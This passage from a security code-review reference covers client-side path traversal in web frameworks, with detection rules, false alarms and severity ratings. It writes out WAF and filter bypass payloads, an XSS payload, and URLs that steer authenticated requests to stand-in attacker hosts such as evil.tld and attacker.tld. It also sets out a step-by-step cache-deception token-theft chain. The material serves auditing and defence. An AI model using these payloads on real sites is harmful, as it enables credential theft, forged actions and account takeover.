### Open-redirect via CSPT (`location.href` / `location.assign` / `location.replace`)

A decoded param interpolated into a navigation sink is an open-redirect primitive:

```javascript
// VULN — decoded query param drives navigation
const next = useSearchParams()[0].get('next');   // "//evil.tld/phishing" or "../../auth/logout"
location.assign(next);
location.href = next;
window.open(next);
```

Combine with CSPT: a redirected fetch returning a URL string that flows into `location.assign` chains CSPT → open redirect → credential theft via spoofed login page on the attacker domain.

## Payload & Filter-Bypass Techniques

The path the attacker controls is rarely the *whole* URL — usually it sits between a fixed prefix and a fixed suffix, often with a sanitizer applied. These techniques widen a constrained injection into a usable traversal. Recognizing them in code review prevents false negatives where a partial constraint is mistaken for a full defense.

| Technique | Use when | Payload mechanic |
|-----------|----------|------------------|
| **Suffix truncation** | input sits mid-path with a fixed trailing segment, e.g. `fetch(\`/articles/${id}/metadata\`)` | end the value with `?` (`%3F`) or `#` (`%23`) — everything after becomes query/hash, so `id=../uploads/x.json%3F` → `/articles/../uploads/x.json?/metadata` → reaches `/uploads/x.json`. (`#` is not even sent to the server.) |
| **Single `..` past `encodeURIComponent`** | every segment is `encodeURIComponent`'d (so `/` is blocked) but you control ≥1 segment | `encodeURIComponent` leaves `.` untouched: set a segment to exactly `..` to climb one level per controlled segment; chain across multiple segments to reach a sibling path sharing the fixed suffix (`group=..&user=uploads&id=x.json` → `/users/../uploads/posts/x.json` → `/uploads/posts/x.json`) |
| **Empty / `.` / `/`** | hitting a more general handler is enough (list-all vs. one record) | `id=`, `id=.`, `id=/` → `/users/`, `/users/.`, `/users//` — collapses to a less-specific route |
| **Backslash = slash** | a custom filter blocks `/` but not `\` | the browser treats `\` as `/` in URLs and rewrites it before sending: `..\..\admin` → `/../../admin` |
| **Tab/newline stripping** | a filter looks for the literal string `..` or a keyword | the URL parser (and `fetch()` itself) silently strips `\t`/`\n`/`\r` first: `.%0A.` (`.\n.`) **and** `.%09.` (`.\t.`, tab) both parse as `..`; `bloc%0Aked` defeats a `blocked` keyword filter. Combined WAF-bypass shape: `%2F%2e%09%2e%5C` → `fetch` drops the `%09` and treats `%5C` as `/`, resolving to `/../` while a `..`/`%2e%2e` pattern-matcher sees nothing |
| **Case / double encoding** | a server or reverse proxy decodes before resolving | test both `%2f`/`%2F`; if the app explicitly `decodeURIComponent`s its input, `%252e%252e%252f` round-trips to `../`; mixed obfuscation `%2e%0a%09%2e\other` → `../other` |
| **Leading `//` → cross-origin** | the controlled value is the FIRST path segment, e.g. `fetch(\`/${lang}/info\`)` | a value starting with `//host` is parsed as a protocol-relative absolute URL: `lang=/attacker.com` → `//attacker.com/info` — the fetch (and any `headers`/`body` it carries) goes cross-origin (see Authorization-header leak below) |

### Authorization-header leak via cross-origin redirect

### Cross-origin host hop via 307/308 (method + body preserved)

A CSPT normally only controls the path on the *current* origin. To reach a more sensitive sibling origin (e.g. `api.example.com` from `app.example.com`), chain a gadget that issues a **307/308** redirect: unlike 301/302/303, these **preserve the HTTP method, body, and most headers**, so a CSPT-controlled `POST` keeps its body when it lands on the new host. Useful gadgets: an on-site open redirect that returns 307/308, or image-transform/proxy endpoints that emit a 307 to a chosen subdomain+path (`/cdn-cgi/image/.../https://api.example.com/<path>`). Caveats that decide exploitability: the destination must allow the request via **CORS**; cookies follow their **SameSite** policy; and browsers **do not forward `Authorization` across a cross-origin redirect** — so this hop is most useful against **cookie- or custom-header-authenticated** APIs. Flag any CSPT that can reach a 307/308-emitting gadget on the same origin as a **cross-origin escalation** primitive, not a same-origin-only finding.

When the vulnerable `fetch` sets sensitive `headers` (e.g. `Authorization: Bearer …`) or a body, a leading-`//` or open-redirect gadget that sends the request **cross-origin** can exfiltrate them. The browser's rule: a request that is **same-origin at first** has its `Authorization` header dropped on a cross-origin redirect, but a request that is **cross-origin from the start keeps it across further redirects** — and `www.`/`api.` subdomain differences count as cross-origin. So traversing a `fetch` on `example.com` to `https://api.example.com/redirect?url=https://attacker.tld` forwards the bearer token to the attacker. Flag any CSPT-controllable `fetch` that attaches `Authorization`/cookies/CSRF headers and can be steered cross-origin as a **credential-exfiltration** primitive, not just a redirected read.

## Gaining Control of the Response (gadgets)

A CSPT that only *reads* an endpoint becomes XSS/CSRF when the attacker can make the redirected request return **attacker-controlled content**. Audit the app for these response gadgets and treat any that is reachable from a CSPT as an escalation, not a separate low-severity bug:

- **File upload / download** — upload JSON (or any allowed type) whose fields match what the frontend reads, then traverse the fetch to its same-origin download URL. The most common gadget; protections like `Content-Disposition: attachment`, blocked `.html`, or CSP do **not** stop a `fetch` from reading the body.
- **Polyglots** — when upload validation enforces a format (PDF/image), craft a file that is simultaneously valid JSON (starts `{"`, ends `"}`) and a valid PDF/WebP, so it passes the filter yet parses as the JSON the frontend expects.
- **Content-type confusion** — any JSON endpoint that reflects your input (e.g. a profile `name`) is an HTML gadget: JSON does not encode `<`, so traversing an `innerHTML`-bound fetch to `/users/1337?` where the name is `<img src onerror=alert(origin)>` renders it as HTML. No upload needed.
- **Open redirect as a gadget** — an on-site `…/redirect?url=https://attacker.com` lets the CSPT reach the attacker's server (which can return any body/headers/CORS), turning a same-origin-only CSPT into full response control.
- **Recursion** — when the response is JSON whose fields feed *another* fetch, chain CSPT through those IDs into a second CSPT (e.g. GET→POST escalation, more HTML sinks).

## CSPT → Cache Deception → Account Takeover

A CSPT can weaponize an otherwise-unexploitable **web cache deception** finding (and vice-versa). The link is the same property that makes CSPT defeat CSRF tokens: the redirected request carries the legitimate page's **auth header/cookies**, which the victim's browser would never attach to a directly-typed URL.

Chain:
1. A sensitive same-origin endpoint (e.g. `GET /v1/token` returning the user's token) requires an auth header, so it cannot be triggered by a plain navigation — and on its own it is cache-deception-vulnerable: requesting `/v1/token.css` returns the same JSON but the CDN now caches it (`Cache-Control: public`, static-looking extension).
2. A CSPT exists in an **authenticated** client `fetch`: `fetch(\`https://api.example.com/v1/users/info/${userId}\`, { headers: { 'X-Auth-Token': … } })`.
3. Victim visits `https://app/profile?userId=../../../v1/token.css`. The fetch resolves to `https://api.example.com/v1/token.css` **with the victim's auth header**, so the API returns the victim's token and the CDN caches it under that static-looking key.
4. The attacker then fetches `https://api.example.com/v1/token.css` **unauthenticated** and reads the victim's cached token → account takeover.

Detection rule: when a CSPT-controllable authenticated `fetch` shares an origin with any endpoint that returns sensitive data and is reachable with a cache-deception suffix (`.css`/`.js`/`.json`/path-confusion), flag a **Critical** CSPT→cache-deception→ATO chain. See `web_cache_deception.md`.

## CSPT → CSRF Chain

A practical exploitation method uses a CSPT primitive to *redirect a state-changing API call* to a different endpoint on the same origin. Because the browser still attaches the user's session cookies to the redirected request, CSPT becomes a fully-functional CSRF primitive even when the target API uses `SameSite=Lax`/`Strict` cookies — the request originates from the legitimate first-party page.

Typical chain:

1. Application has a Settings page that issues `fetch('/api/users/me/email', { method: 'POST', body: ... })`.
2. The endpoint URL is built using a decoded path param: `fetch(\`/api/users/\${userId}/email\`, …)`.
3. Attacker crafts a link `https://victim/settings/..%2F..%2Fadmin%2Fdelete-all` that, when the victim visits while logged in, causes the POST to land on `/api/admin/delete-all` instead of the user's own email endpoint.
4. Because the request shares the legitimate session, the chain succeeds when the endpoint does not require a CSRF token or the app's fetch wrapper auto-includes one — do not assume server-side CSRF tokens are always sent on redirected fetch calls.

Detection rule: flag any state-changing (`POST`/`PUT`/`PATCH`/`DELETE`) `fetch` whose URL template interpolates a decoded source as a high-priority CSPT-to-CSRF finding, NOT just a CSPT-to-data-disclosure finding.

**Source restrictions define exploitability.** A CSPT reroutes an *existing* request, so the attacker inherits its fixed HTTP method, headers, and body — the only thing under control is the path. Triage each source by what its request already carries:

- **Method** is fixed per source. A `GET` source and a `POST` source on the same app are different primitives with different reachable sinks. Enumerate sinks that share the source's method/headers/body.
- **Headers/body** ride along unchanged (this is *why* it defeats CSRF tokens: the legitimate page attaches them). Body params can't be set directly, but you can often **append `?key=value&` in the traversal** to inject query params that the backend merges over/with the body — sometimes supplying the missing parameters a state-changing endpoint needs.

**GET-sink → POST-sink chaining via a controllable-JSON gadget** (the high-impact GET→POST chaining technique): when only a `GET` CSPT is available, point it at an endpoint that returns attacker-controlled JSON — most commonly a **file upload/download** feature (upload JSON, then traverse to its download URL). The frontend parses that JSON and uses a field (e.g. `id`) to build a *second* request; by controlling that field you drive a `POST`/`PATCH`/`DELETE` to an arbitrary endpoint. Two chained CSPTs turn a read-only primitive into a state-changing one. When auditing, treat any file-upload/download API reachable from a CSPT as a CSRF gadget, not just a data sink.

Representative CVEs (CSPT2CSRF): **CVE-2023-45316** (Mattermost, POST sink), **CVE-2023-6458** (Mattermost, GET-sink chained to POST via the file gadget), and a 1-click POST-sink CSPT2CSRF in Rocket.Chat — all driven by a decoded path/query value reflected into a subsequent request path.

## Second-Order CSPT (stored payload / native deep-link source)

CSPT is not only a web-router primitive. The decoded value that lands in a request path can arrive **second-order** — stored by the attacker earlier and fetched back later — and the consuming app can be a **native mobile app**, not a browser. The source taxonomy above is web-centric; this section covers the mobile/stored variant.

**The chain** (native app + trusted storage/redirect service):
1. The app embeds an API key for a helper service it trusts — e.g. a **link shortener**. The attacker extracts that key from the app binary/traffic (see `android_security.md` / `ios_security.md` — hardcoded secrets) and uses it to create a short link with an **arbitrary JSON parameter blob** attached; the service stores the blob for that link.
2. The victim opens the link. The app's **registered deep-link / universal-link / intent-filter handler** catches it, **fetches the JSON back** from the shortener, and **dispatches one of its internal actions** based on the blob's content.
3. That internal action builds an **authenticated** request (the app attaches the victim's session/token) and **concatenates a blob field into the URL path**. `#` truncation (`%23`) drops the intended trailing path, and `../` (`%2e%2e%2f`) climbs — so the field rewrites the destination into an **arbitrary authenticated request to any endpoint of the API, as the victim** (same primitive as CSPT→CSRF, but the source is stored JSON delivered via a deep link).

**Why it's "second-order"**: the path-controlling value is not in the inbound URL — it is attacker-stored content the app round-trips into a request builder while trusting it. Generalizes to any client (mobile or web) that fetches remote/stored JSON and interpolates a field into a later request path: push-notification payloads, server-driven UI / "action" descriptors, QR/NFC deep links, saved drafts, webhook-echo blobs.

**Landing impact when only the path/query is yours** (the forged request's body usually isn't controllable, but you control the path and can append `?k=v&`): some backends **parse query-string params as body params** (framework param binding — see `api_security.md`), which makes a path-only primitive reach body-bound handlers. Three gadgets to complete impact:
- **Same-named params via query string** — a state-changing endpoint that accepts its parameters from the query string as readily as the body; the appended `?k=v&` supplies them.
- **No-body endpoints that ignore the auto-sent params** — target an action that needs no body and simply disregards whatever params the forged request already carries, so the inherited body/headers don't break it.
- **Partial JSON injection on a different endpoint, chained in to mask the response** — route through an endpoint where you can inject into a JSON response to shape/suppress what the app then parses, hiding errors or steering the next internal action.

**SAST signals**:
```bash
# deep-link/intent handler -> fetch remote JSON -> internal action builds a request path from a field
rg -n "openURLContexts|application\(.*open url|ACTION_VIEW|getData\(\)|onNewIntent|addEventListener\('url'|Linking\.addEventListener" --glob '*.{swift,kt,java,js,ts,dart}'
rg -n "shorten|short\.link|deeplink|universal.?link|app.?link" --glob '*.{swift,kt,java,js,ts,dart}' -i
# a field from fetched JSON interpolated into a request URL path with no allowlist
rg -n "\$\{[^}]*\}/|\"\s*\+\s*\w+\s*\+\s*\"/|path\s*=\s*.*\+|URL\(string:\s*\".*\\\(" --glob '*.{swift,kt,java,js,ts,dart}' -C2
```

**SAFE**: treat deep-link-delivered and remotely-fetched content as untrusted input, not configuration; **allowlist** the action and validate any field bound to a request path against a strict pattern (reject `..`, `/`, `\`, `#`, `?`, and their `%`-encodings) before building the URL; never embed third-party service API keys in the client (proxy through your backend); bind state-changing params **explicitly to the body** and do not let query params merge into body for those routes (see `api_security.md`); canonicalize then re-validate the resolved request path.

## WAF / Filter Bypass via Encoding-Level Mismatch

A depth-checking WAF (or any pre-sink filter) and the application frequently URL-decode the value a **different number of times** before they act on it. That mismatch is a reliable bypass, and it is also the reason a single-pass decode-then-check guard is **not** a real barrier. Define three quantities:

- **depth** of a URL path = number of directory segments − number of `../` sequences (e.g. `/a/../../c` → depth −1). Depth-based WAFs block requests whose depth goes negative.
- **encoding level** of a string = how many times you must URL-decode it to reach the literal value (e.g. `b%252561` → `b%2561` → `b%61` → `ba` is level 3).
- **WAF level** / **app level** = how many times the WAF (resp. the app, before the value reaches the `fetch` sink) decodes the value. You learn the app level empirically: navigate to `…/%2561` and see whether the issued request contains `a` (decoded once) or `%61`.

**The three bypass cases** (target: keep WAF-computed depth ≥ 0 while the value the browser/app resolves still has negative depth):
- **WAF level < app level** → over-encode the payload so the WAF can't see the `../`s but the app decodes them out: WAF level 1, app level 2 → `..%252f..%252f..%252fasdf` (WAF sees inert `%2f`; app decodes twice to `../../../asdf`).
- **WAF level > app level** → pad with encoded `a%2fa` segments the WAF decodes (raising its directory count) but the app does not, keeping WAF depth ≥ 0 while the app still traverses: WAF level 2, app level 1 → `a%252fa%252fa%252fa%2f..%2f..%2f..%2f..%2fasdf` (WAF reads `a/a/a/a/../../../../asdf`, depth 0; app passes `a%2fa%2fa%2fa/../../../../asdf` ≡ `../../../asdf`).
- **WAF level = app level** → exploit that **the browser treats `%2e%2e/` (encoded dots, literal slash) exactly like `../`**. A payload decoding (in both WAF and app) to `%2e%2e/%2e%2e/%2e%2e/asdf` has positive WAF depth (the WAF counts `%2e%2e` as a normal segment, not a climb) yet the browser still resolves the traversal. This is the most broadly useful nugget: **encoded dots still climb in the browser even though depth/regex filters that match literal `..` miss them.**

**SAST / barrier implication**: a decode-or-normalize-then-validate guard is only sound when it **canonicalizes to a fixpoint** (decode repeatedly until the string stops changing) **before** the depth/charset check, AND the value is not decoded again afterward on the way to the sink. Flag as bypassable: single-pass `decodeURIComponent`-then-check; depth/`..`-regex filters that don't also reject `%2e`/`%252e`/`%2f`/`%252f` forms; and any "a WAF handles path traversal" assumption. SAFE remains an **allowlist/numeric coercion of the segment** (not a decode-count-sensitive denylist) before it reaches the request builder.

## Tooling for Triage

These are dynamic-testing capabilities, useful when the user explicitly asks for runtime verification.

- **Browser-based CSPT scanners** automatically mutate dynamic path segments with `%2F` / `%5C` / `%252F` / `%255C` / literal `../` and observe whether subsequent `fetch`/XHR/WebSocket URLs traverse to a different endpoint. The fastest way to confirm a real target.
- **Passive CSPT scanners** flag query params reflected into the *path* of another request and enumerate sinks sharing the same host/method; canary-token modes surface **stored and DOM-based** CSPT that a passive scan alone misses (paste the canary as input, watch for it appearing in a request path).
- **CSPT-to-CSRF tooling** enumerates reachable state-changing endpoints from a CSPT source and generates a working CSRF PoC link.
- **Intercepting-proxy workflow**: match-and-replace rules and response highlighting make it straightforward to trace decoded-param → fetch flows.
- Manual confirmation: open DevTools → Network, set a breakpoint on `fetch`/`XMLHttpRequest.open`, navigate to the crafted URL, and check the *resolved* request URL after the browser collapses `../`.

**Discovery heuristics (dynamic):**
- **The `undefined` / `null` path-segment tell.** An outbound request that contains a literal `undefined` or `null` in its path on a normal page load (e.g. the homepage fetches `/category/undefined`) is a strong signal of a **hidden CSPT source**: the frontend is interpolating a currently-unset variable (often a query param like `?category=`) into a request path. Supplying the missing param (`?category=anything`) reveals the reflection. Standard param-miners miss this because adding the param produces **no visible change in the rendered page** — only the outbound request changes — so diff-based discovery returns nothing. Grep app JS for request templates fed by optional/possibly-undefined values, and watch the Network tab for `undefined`/`null`/`NaN` path segments.
- **Partial / substring matching, not exact match, when correlating source→request.** A source value is frequently **transformed** before it lands in the path (`category=news` → `/api/news.json`, `/api/news-category`, lowercased, slugified). Exact-string comparison of a URL part against outbound request URLs yields false negatives; match on substring/normalized containment (accept more false positives to avoid missing real sinks), then confirm manually. The `referer`-header approach is unreliable for the same correlation because cross-origin requests strip path/query from `Referer`.

## Detection Rules

### Generic CSPT Pattern

A finding requires (1) a decoded source from the table above, (2) a fetch-style sink, and (3) string interpolation between them with no allowlist/encoding step in between.

```javascript
// VULN signature — decoded param flows into a fetch URL template
const x = <decoded-source>;             // e.g., useParams().id
fetch(`/api/.../${x}/...`);             // any axios/HttpClient/useFetch/$fetch
```

```javascript
// MOSTLY SAFE — value re-encoded at the sink (blocks new `/`, so no arbitrary descent)
// BUT encodeURIComponent does NOT encode `.`: x=".." still climbs one level
// (/api/<x>/foo → /api/foo). Fully safe only with an allowlist/numeric coercion below.
fetch(`/api/.../${encodeURIComponent(x)}/...`);
```

```javascript
// SAFE — value is constrained by an allowlist or regex BEFORE the sink
if (!/^[\w-]+$/.test(x)) throw new Error("invalid id");
fetch(`/api/.../${x}/...`);
```

### Framework-Specific Detection

```javascript
// React / Next.js (client) — VULN
const { id } = useParams(); fetch(`/api/x/${id}`);                // React Router only
const sp = useSearchParams(); fetch(`/api/x?w=${sp.get("w")}`);   // both

// Next.js route handler — VULN (secondary PT)
export async function GET(_, { params }) {
  const { path } = await params;                                  // decoded
  return fetch(`https://internal/${path.join("/")}`);
}
```

```javascript
// Vue / Nuxt — VULN
const r = useRoute(); useFetch(`/api/x/${r.params.id}`);
$fetch(`/api/x/${r.query.w}`);
```

```typescript
// Angular — VULN
this.route.paramMap.subscribe(p => this.http.get(`/api/x/${p.get("id")}`));
this.route.queryParamMap.subscribe(q => this.http.get(`/api/x?w=${q.get("w")}`));
```

```typescript
// SvelteKit — VULN (server-side is most dangerous)
// +page.server.ts
export const load = async ({ params, fetch }) =>
  ({ d: await (await fetch(`http://internal/${params.id}`)).json() });

// +server.ts
export const GET = async ({ params, fetch }) =>
  fetch(`http://internal/${params.id}`);
```

```javascript
// Ember — VULN
model(params) { return fetch(`/api/x/${params.user_id}`); }
// or via Ember Data adapter:
urlForFindRecord(id) { return `/api/users/${id}`; } // no encodeURIComponent
```

```tsx
// SolidStart — VULN (search params and server fns)
const [sp] = useSearchParams(); fetch(`/api/x?w=${sp.w}`);
const f = query(async (id) => { "use server"; return fetch(`http://internal/${id}`); }, "f");
```

### CSPT -> XSS Detection

Flag CRITICAL when ANY of the following are present in the same component/page where a CSPT primitive exists:

- React/Next: `dangerouslySetInnerHTML={{ __html: <fetch-response> }}`
- Vue/Nuxt: `<div v-html="<fetch-response>" />`
- Angular: `[innerHTML]="<bypass-trusted-html-of-fetch>"`
- SvelteKit: `{@html <fetch-response>}`
- Ember: `{{{<fetch-response>}}}` or `htmlSafe(<fetch-response>)`
- SolidStart: `<div innerHTML={<fetch-response>} />`
- Any framework (except Angular `[href]`): a `<fetch-response>` field bound into `href`/`src`/`formaction` that can be a `javascript:`/`data:` URL — e.g. `<a href={resp.externalUrl}>`, `:href="resp.website"`, `<img src={resp.avatar}>` (click-triggered XSS; no innerHTML needed)

## Confirming a Finding

1. Identify the decoded source (`useParams`, `route.params`, `paramMap.get`, `params.*` in load, etc.) and confirm it bypasses the framework's safe sources (e.g., not `route.path`, `router.url`, `useLocation().pathname`).
2. Trace the value to a `fetch`-style sink and confirm there is NO `encodeURIComponent`, allowlist regex, or param matcher (`[id=id]` in SvelteKit) between source and sink.
3. Construct an encoding payload that survives both the browser and the framework decoder (see "Decoding Cheat Sheet"). Use literal `../` for query params and splat/catch-all routes; use `%2F`-style encoding for single-segment dynamic params; use `%252F` only for React Router and Next.js page query — and for React Router try **both** `%252F` and `%252f`, since its double-decode replace is case-sensitive (uppercase-only).
4. Verify the fetch URL after browser normalization. The browser resolves `../` in the path portion of the request just before sending; the resolved path is what the server sees.
5. For secondary-context PT, repeat with the server sink as the request target and confirm reachability of internal hosts/paths.
6. For XSS chaining, demonstrate that the redirected fetch endpoint returns attacker-controlled HTML (file upload, attachments, user-generated content) and that the response flows into the framework's HTML sink.

## Common False Alarms

- The decoded value is constrained by an allowlist regex (e.g., SvelteKit param matcher `[id=id]`, route guards that reject non-matching shapes) BEFORE reaching `fetch`.
- The value is `encodeURIComponent`'d at every interpolation point (full encoding, not just `encodeURI`) **AND** the template has no fixed trailing path the attacker can reach by climbing. Caveat: `encodeURIComponent` does NOT encode `.` — a segment set to exactly `..` survives encoding and still collapses one directory level (`/api/groups/${encodeURIComponent(x)}/...` with `x=".."` → `/api/groups/../...`). `encodeURIComponent` blocks injecting new `/` (no arbitrary descent / no multi-`../`), but it does NOT block single-`..` climbing; an attacker controlling several encoded segments can climb several levels and land on a sibling endpoint that shares the template's fixed suffix. Treat `encodeURIComponent`-only as a **partial mitigation**, not a clean false alarm — a strict allowlist/regex or numeric coercion is the real defense. (See "Payload & Filter-Bypass Techniques".)
- The value flows ONLY into framework-safe sources: `useLocation().pathname`, `route.path`, `route.fullPath`, `router.url`, `window.location.pathname`, `getRouterParam()` (Nuxt server, no `{ decode: true }`), or SolidStart `useParams()` for single segments.
- The fetch URL is constructed with `URL` / `URLSearchParams` and the value is set via `searchParams.set(...)`, which encodes; OR the value is the FULL URL passed to `fetch` (no traversal possible — no base path to escape).
- The response is rendered with framework auto-escaping only (no `dangerouslySetInnerHTML`/`v-html`/`{@html}`/triple curlies/`bypassSecurityTrustHtml`/Solid `innerHTML`) **AND** no CSPT-controlled field is bound into an `href`/`src`/`formaction` attribute — CSPT to XSS is NOT exploitable, but the underlying CSPT may still be a CSRF/IDOR primitive. Caveat: auto-escaping does NOT stop a `javascript:`/`data:` URL in an `href`/`src` binding (see "URL-attribute scheme injection") — that is still XSS in React/Vue/Svelte/Ember/Solid (Angular `[href]` is the exception). Only treat the auto-escape path as safe when every CSPT-reachable response field lands in a text/escaped position, not a URL attribute.
- Static `fetch` URLs with no string interpolation of user-controlled values.

## Severity Heuristics

- **Critical**: CSPT chained to XSS via `innerHTML`-class sink AND the redirected endpoint can return attacker-controlled HTML (file upload / attachments / user content); OR CSPT into a dynamic module/script-load sink (`import()`, `importScripts()`, `Worker`, `serviceWorker.register`) that can reach an attacker-controllable same-origin script (code execution in page/worker context); OR secondary-context PT in a server route handler / `+page.server.ts` / Nuxt `server/api` / SolidStart `"use server"` that reaches internal services; OR a GET→POST CSPT2CSRF chain (via a controllable-JSON/file-upload gadget) that reaches a sensitive state-changing endpoint; OR a CSPT→cache-deception chain that caches a victim's authenticated sensitive response (token/PII) at an attacker-readable URL (account takeover); OR a leading-`//`/open-redirect gadget that steers a CSPT `fetch` cross-origin and leaks its `Authorization`/cookie/CSRF header.
- **High**: CSPT primitive that lets an authenticated user redirect a privileged API call to a different same-origin endpoint (CSRF primitive, IDOR amplifier, ACL bypass), without an XSS chain.
- **Medium**: CSPT to a non-sensitive endpoint, or an open-redirect-only chain (e.g., Angular `router.navigate([decoded])`).
- **Informational**: Decoded source flows into a fetch URL but is gated by a strict allowlist or param matcher; document as defense-in-depth gap.

## Business Risk

- Bypassed frontend route guards: an attacker triggers privileged actions or reads data the app's UI never exposes.
- CSRF primitive: state-changing API calls (DELETE, PATCH, POST) issued under the victim's session, with the attacker controlling the destination via a crafted link.
- Stored XSS via attachment/upload chain when CSPT redirects fetches to user-uploaded HTML and that HTML flows into a raw-HTML render sink.
- SSRF / internal-service compromise via secondary-context path traversal (Next.js route handlers, SvelteKit `+page.server.ts`, Nuxt server, SolidStart server functions) — the server bypasses its own auth middleware (`hooks.server.ts` is not invoked for internal `fetch`).
- Information disclosure via traversal into admin/diagnostic endpoints exposed only to authenticated sessions.

## Core Principle

Treat every value returned by a frontend router's param/query API as URL-decoded user input until proven otherwise. The strongest defense is to constrain it with a strict allowlist (regex / param matcher) or numeric coercion BEFORE it reaches the sink; re-encoding with `encodeURIComponent` at every fetch interpolation helps but is only partial (it blocks `/` injection, not a single `..` climbing one level), so prefer an allowlist when the template has a fixed trailing path. Or read raw URL state from the framework's safe source (`useLocation().pathname`, `route.path`, `router.url`, `window.location.pathname`, SolidStart `useParams`). Never interpolate a decoded path/query/hash value directly into a `fetch`/`HttpClient`/`useFetch`/`$fetch`/Ember Data URL template without one of those defenses. For hybrid frameworks, apply the same rule on the server side — `+page.server.ts`, route handlers, `server/api/*`, and `"use server"` functions all need the same allowlist or re-encoding before forwarding values into internal `fetch` calls.

## Analyst Notes

1. The browser normalizes literal `../` in the path BEFORE the request is sent. Encoded forms (`%2F`, `%2E%2E`, `%252F`) survive that normalization; choose the encoding the target framework actually decodes.
2. Query strings are NOT path-normalized by the browser. Use literal `../` first; reach for encoding only to bypass WAFs/filters.
3. The hash fragment is never URL-encoded or decoded by the browser — `window.location.hash.slice(1)` is exactly what the user typed.
4. SolidStart's path params and Next.js page-level params are the only framework-decoded sources that are safe by default; everywhere else, assume decoded.
5. SvelteKit param matchers (`[id=id]`) are the strongest framework-level defense; recommend them in remediation.
6. For Nuxt, also audit `revive-payload.client.js` consumers and any `__NUXT__` payload sources for stored CSPT (CVE-2025-59414 class).
7. When triaging, distinguish CSPT (client `fetch`) from secondary-context PT (server `fetch` with internal reachability) — the latter is materially higher impact.

## Sources, Sinks & Sanitizers

The closest automated models map CSPT primitives to **client-side request forgery** and **client-side open redirect** when untrusted data is concatenated into URL/fetch targets.

**Sources**: non-server-side remote sources (browser `useParams`, `useSearchParams`, `location`-derived values).

**Sinks**: `fetch`, `axios`, `XMLHttpRequest.open`, URL template concatenation before HTTP request; dynamic module/script loaders that resolve-then-execute (`import()`, `importScripts()`, `Worker`/`SharedWorker`, `serviceWorker.register`).

**Sanitizers**: numeric coercion of IDs; allowlist regex before interpolation; `URLSearchParams.set` for query values; sanitizing prefix edges in URL builders. `encodeURIComponent` at the sink is only a **partial** sanitizer — it stops `/` injection (no arbitrary descent) but not single-`..` climbing, so it is not sufficient on its own.

**SAFE pattern**: restrict param to digits — parse `message_id` as number before fetch; matches manual `encodeURIComponent` / allowlist guidance in this reference.

**Related patterns** (not CSPT):
- Client-side URL redirect — open redirect via decoded param in `location` / router
- Server-side request forgery — secondary-context PT in route handlers / server fetch (not browser-normalized)
- Path injection — server-side path sinks (Next route handler internal paths)
- Web cache deception — CSPT can cache an authenticated response at an attacker-readable URL (see `web_cache_deception.md`)
- HTTP-to-file access — separate CWE-912 backdoor pattern, not CSPT

Framework-specific decoding tables (React Router vs SolidStart) require heuristic/manual review. Vue/Nuxt/Angular/SvelteKit CSPT requires taint from client source to fetch sink when URL is built in the browser bundle.
